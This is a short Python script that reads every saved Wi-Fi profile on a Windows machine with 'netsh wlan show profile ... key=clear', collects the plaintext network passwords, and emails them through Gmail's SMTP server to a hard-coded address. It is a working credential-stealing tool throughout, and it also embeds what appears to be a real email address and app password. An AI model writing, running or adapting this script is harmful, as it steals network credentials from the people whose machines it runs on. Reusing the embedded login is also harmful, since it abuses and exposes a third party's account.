#!/usr/bin/env python

import subprocess, smtplib, re
import chardet


def send_mail(email, password, msg) :
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg.encode('utf-8'))
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)

network_names_en = re.findall(r"\s* Profile : (.*)", networks.decode("ISO-8859-1"))
network_names_ko = re.findall(r"\s* 프로필 : (.*)", networks.decode("EUC-KR"))

result = []
send_result = ""

if network_names_en :
    for match in network_names_en:
        if '\r' in match :
            match = match.replace('\r','')
        match = re.sub(r'[^a-zA-Z0-9가-힣_+(~)?.\s]','',match)
        command = f'netsh wlan show profile "{match}" key=clear'
        current_result = subprocess.check_output(command,shell=True)
        result.append(current_result.decode("ISO-8859-1"))
elif network_names_ko :
    for match in network_names_ko:
        if '\r' in match :
            match = match.replace('\r','')
        match = re.sub(r'[^a-zA-Z0-9가-힣_+(~)?.\s]','',match)
        command = f'netsh wlan show profile "{match}" key=clear'
        current_result = subprocess.check_output(command,shell=True)
        result.append(current_result.decode("EUC-KR"))
else :
    print("[-] Not Found!! ")

if result :
    for v in result :
         send_result = send_result + v

send_mail("changyucustom@gmail.com","knfgiiymlimafezg",send_result)
